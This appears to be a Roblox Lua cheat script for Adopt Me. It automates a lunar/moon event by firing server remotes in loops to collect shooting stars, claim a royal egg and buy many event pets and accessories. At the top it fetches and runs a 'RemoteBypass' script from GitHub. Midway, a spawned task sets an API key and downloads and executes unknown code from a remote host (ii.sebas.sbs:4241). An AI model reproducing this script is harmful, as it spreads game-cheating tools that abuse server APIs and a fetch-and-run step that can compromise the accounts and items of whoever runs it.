wait(5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(1)
local args = {
    [1] = "pets",
    [2] = "lunar_2025_prism_snake",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
wait(1)
local locations = {"MainMap", "MoonInterior"}
local args = {}

-- Function to collect stars
local function collectStars(location, isSpecial)
    for i = 1, 100 do
        args[1] = location
        args[2] = tostring(i)
        
        -- If it's a special star, add the third argument
        if isSpecial then
            args[3] = true
        else
            args[3] = nil
        end
        
        game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
        wait(0.2)  -- Delay of 0.2 seconds
    end
end

-- Collect stars for both locations
for _, location in ipairs(locations) do
    collectStars(location, false)  -- Regular stars
    wait(1)  -- Wait 1 second before moving to the next location
    collectStars(location, true)   -- Special stars
    wait(1)  -- Wait 1 second before moving to the next location
end

wait(1)
local args = {
    [1] = "MoonInterior"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ClaimRoyalEgg"):FireServer(unpack(args))
wait(1)
task.spawn(function()
    task.wait(1)
    getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
end)
wait(1)
local args = {
    [1] = "pets",
    [2] = "lunar_2025_blossom_snake",
    [3] = {
        ["buy_count"] = 5
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pets",
    [2] = "lunar_2025_nebula_snake",
    [3] = {
        ["buy_count"] = 4
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

local args = {
    [1] = "pets",
    [2] = "lunar_2025_prism_snake",
    [3] = {
        ["buy_count"] = 2
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pets",
    [2] = "lunar_2025_prism_snake",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pets",
    [2] = "lunar_2025_blossom_snake",
    [3] = {
        ["buy_count"] = 3
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pets",
    [2] = "lunar_2025_nebula_snake",
    [3] = {
        ["buy_count"] = 3
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "strollers",
    [2] = "lunar_2025_rickshaw_stroller", 
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pets",
    [2] = "lunar_2025_nebula_snake",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pets",
    [2] = "lunar_2025_prism_snake",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pets",
    [2] = "lunar_2025_prism_snake",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pet_accessories",
    [2] = "lunar_2025_dancing_lion_mask",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "toys",
    [2] = "moon_2025_shooting_star_grappling_hook",
    [3] = {
        ["buy_count"] = 2
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "toys",
    [2] = "moon_2025_shooting_star_grappling_hook",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pet_accessories",
    [2] = "moon_2025_lunar_new_year_headdress", 
    [3] = {
        ["buy_count"] = 2
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pet_accessories",
    [2] = "moon_2025_lunar_new_year_headdress", 
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pet_accessories",
    [2] = "moon_2025_lunar_new_year_headdress", 
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

wait(1)

local args = {
    [1] = "pet_accessories",
    [2] = "lunar_2025_dancing_lion_mask",
    [3] = {
        ["buy_count"] = 1
    }
}

game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
